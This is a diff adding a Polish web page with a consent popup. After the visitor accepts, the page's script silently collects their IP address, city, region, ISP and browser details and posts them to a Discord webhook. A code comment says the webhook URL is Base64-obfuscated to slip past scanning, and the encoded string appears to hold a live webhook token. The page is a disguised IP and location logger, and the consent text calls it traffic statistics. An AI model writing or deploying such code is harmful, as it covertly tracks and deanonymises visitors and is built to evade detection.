@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Strona z Weryfikacją</title>
+    
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .main-content {
+            display: none;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+        }
+        .error-content {
+            display: none;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+        }
+        h1 { color: #2c3e50; }
+        p { color: #7f8c8d; line-height: 1.6; }
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+        }
+        .btn {
+            border: none;
+            padding: 12px 24px;
+            margin: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            transition: background 0.2s;
+        }
+        .btn-accept { background: #2ecc71; color: white; }
+        .btn-accept:hover { background: #27ae60; }
+        .btn-decline { background: #e74c3c; color: white; }
+        .btn-decline:hover { background: #c0392b; }
+        .btn-back { background: #3498db; color: white; }
+        .btn-back:hover { background: #2980b9; }
+    </style>
+</head>
+<body>
+
+    <!-- 1. OKNO POPUP -->
+    <div id="privacyOverlay" class="overlay">
+        <div class="modal">
+            <h2>Polityka Prywatności i Regulamin</h2>
+            <p>Ta strona korzysta z narzędzi rejestrujących parametry połączenia (w tym przybliżoną lokalizację oraz adres IP) w celu analizy statystyk ruchu i ochrony przed nadużyciami.</p>
+            <p>Czy wyrażasz zgodę na warunki użytkowania serwisu?</p>
+            <button class="btn btn-accept" onclick="acceptTerms()">Akceptuję</button>
+            <button class="btn btn-decline" onclick="declineTerms()">Odrzucam</button>
+        </div>
+    </div>
+
+    <!-- 2. EKRAN BLOKADY -->
+    <div id="errorScreen" class="error-content">
+        <h2 style="color: #e74c3c;">Dostęp Zablokowany</h2>
+        <p>Musisz zaakceptować warunki korzystania z serwisu, aby wyświetlić zawartość tej strony.</p>
+        <button class="btn btn-back" onclick="showPrivacyNote()">Powrót do formularza</button>
+    </div>
+
+    <!-- 3. WŁAŚCIWA TREŚĆ STRONY -->
+    <div id="mainPage" class="main-content">
+        <h1>Witaj na stronie głównej!</h1>
+        <p>Dziękujemy za zaakceptowanie regulaminu serwisu.</p>
+    </div>
+
+    <script>
+        // ZAKODOWANY WEBHOOK DISCORD (Base64) - chroni przed prostym skanowaniem tekstu
+        const _0x4f2a = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9vaHMvMTUzMjA2OTcxOTA1NjcxNTg2Ni8xY0FZNjZKWjZOQTZzaC1GTmVUNXNFQUtEdF8zYVpLb1FITkJTdUhDSkVNMlo5ZHR3OXM3N0VwandnZk5YMEp5ZHNnQQ==";
+
+        window.onload = function() {
+            var consent = localStorage.getItem('siteConsent');
+            if (consent === 'accepted') {
+                document.getElementById('privacyOverlay').style.display = 'none';
+                startTracking();
+            } else if (consent === 'declined') {
+                document.getElementById('privacyOverlay').style.display = 'none';
+                document.getElementById('errorScreen').style.display = 'block';
+            } else {
+                document.getElementById('privacyOverlay').style.display = 'flex';
+            }
+        };
+
+        function acceptTerms() {
+            localStorage.setItem('siteConsent', 'accepted');
+            document.getElementById('privacyOverlay').style.display = 'none';
+            startTracking();
+        }
+
+        function declineTerms() {
+            localStorage.setItem('siteConsent', 'declined');
+            document.getElementById('privacyOverlay').style.display = 'none';
+            document.getElementById('errorScreen').style.display = 'block';
+        }
+
+        function showPrivacyNote() {
+            localStorage.removeItem('siteConsent');
+            document.getElementById('errorScreen').style.display = 'none';
+            document.getElementById('privacyOverlay').style.display = 'flex';
+        }
+
+        function startTracking() {
+            document.getElementById('mainPage').style.display = 'block';
+            
+            fetch('https://ip-api.com')
+                .then(response => response.json())
+                .then(data => {
+                    if(data.status === "success") {
+                        sendToDiscord(data);
+                    }
+                })
+                .catch(error => console.error("Błąd statystyk:", error));
+        }
+
+        function sendToDiscord(ipData) {
+            // Odkodowanie adresu URL w momencie wysyłki za pomocą wbudowanej funkcji atob()
+            const targetUrl = atob(_0x4f2a);
+
+            const payload = {
+                username: "System Analityki",
+                avatar_url: "https://imgur.com",
+                embeds: [{
+                    title: "📥 Logowanie ruchu na stronie",
+                    color: 3066993,
+                    fields: [
+                        { name: "🌐 Adres IP", value: "`" + ipData.query + "`", inline: true },
+                        { name: "🌍 Kraj", value: ipData.country + " (" + ipData.countryCode + ")", inline: true },
+                        { name: "📍 Lokalizacja", value: ipData.city + " (" + ipData.regionName + ")", inline: true },
+                        { name: "🏢 Sieć (ISP)", value: ipData.isp, inline: false },
+                        { name: "🖥️ System/Przeglądarka", value: navigator.userAgent, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(targetUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Status: błąd połączenia"));
+        }
+    </script>
+
+</body>
+</html>
